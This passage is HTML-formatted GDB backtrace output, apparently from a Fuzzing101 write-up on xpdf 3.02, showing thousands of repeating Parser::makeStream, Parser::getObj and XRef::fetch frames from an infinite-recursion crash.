Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74686</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ae7b0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffba50</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74687</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffba50</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74688</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffba50</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffbc10</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74689</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ae2f0</span>, dict=<span class="number">0x7fffffffbc10</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74690</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ae2f0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffbc10</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74691</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffbc10</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74692</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffbc10</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffbdd0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74693</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ade30</span>, dict=<span class="number">0x7fffffffbdd0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74694</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ade30</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffbdd0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74695</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffbdd0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74696</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffbdd0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffbf90</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74697</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ad970</span>, dict=<span class="number">0x7fffffffbf90</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74698</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ad970</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffbf90</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74699</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffbf90</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74700</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffbf90</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffc150</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74701</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ad4b0</span>, dict=<span class="number">0x7fffffffc150</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74702</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ad4b0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffc150</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74703</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffc150</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74704</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffc150</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffc310</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74705</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556acff0</span>, dict=<span class="number">0x7fffffffc310</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74706</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556acff0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffc310</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74707</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffc310</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74708</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffc310</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffc4d0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74709</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556acb30</span>, dict=<span class="number">0x7fffffffc4d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74710</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556acb30</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffc4d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74711</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffc4d0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74712</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffc4d0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffc690</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74713</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ac670</span>, dict=<span class="number">0x7fffffffc690</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74714</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ac670</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffc690</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74715</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffc690</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74716</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffc690</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffc850</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74717</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ac1b0</span>, dict=<span class="number">0x7fffffffc850</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74718</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ac1b0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffc850</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74719</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffc850</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74720</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffc850</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffca10</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74721</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556abcf0</span>, dict=<span class="number">0x7fffffffca10</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74722</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556abcf0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffca10</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74723</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffca10</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74724</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffca10</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffcbd0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74725</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ab830</span>, dict=<span class="number">0x7fffffffcbd0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74726</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ab830</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffcbd0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74727</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffcbd0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74728</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffcbd0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffcd90</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74729</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ab370</span>, dict=<span class="number">0x7fffffffcd90</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74730</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556ab370</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffcd90</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74731</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffcd90</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74732</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffcd90</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffcf50</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74733</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x55555569ae20</span>, dict=<span class="number">0x7fffffffcf50</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74734</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x55555569ae20</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffcf50</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74735</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffcf50</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74736</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffcf50</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffd110</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74737</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x55555569a9f0</span>, dict=<span class="number">0x7fffffffd110</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74738</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x55555569a9f0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffd110</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74739</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffd110</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74740</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffd110</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffd2d0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74741</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x55555569a530</span>, dict=<span class="number">0x7fffffffd2d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74742</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x55555569a530</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffd2d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74743</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffd2d0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74744</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffd2d0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffd490</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74745</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x55555569a070</span>, dict=<span class="number">0x7fffffffd490</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74746</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x55555569a070</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffd490</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74747</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffd490</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74748</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffd490</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffd650</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74749</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x555555699bb0</span>, dict=<span class="number">0x7fffffffd650</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74750</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x555555699bb0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffd650</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74751</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffd650</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74752</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffd650</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffd810</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74753</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x555555699780</span>, dict=<span class="number">0x7fffffffd810</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74754</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x555555699780</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffd810</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74755</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffd810</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74756</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffd810</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffd9d0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74757</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x555555699370</span>, dict=<span class="number">0x7fffffffd9d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74758</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x555555699370</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffd9d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74759</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffd9d0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74760</span> <span 